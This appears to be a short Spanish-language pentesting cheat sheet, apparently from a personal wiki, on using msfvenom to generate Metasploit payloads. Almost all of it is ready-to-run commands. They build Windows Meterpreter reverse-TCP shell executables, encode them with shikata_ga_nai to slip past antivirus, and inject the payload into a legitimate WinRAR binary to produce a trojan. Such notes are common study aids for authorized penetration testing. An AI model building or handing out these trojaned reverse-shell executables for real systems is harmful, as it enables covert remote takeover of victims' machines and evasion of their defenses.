# ¿Qué es?

Esa una utilidad que nos permite generar payloads para [[metasploit]].
# Uso
## Generar reverse shell

### Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

## Encoder

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe > shell.exe
```

## Inject into executable

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -x ~/winrar -k > shell.exe
```

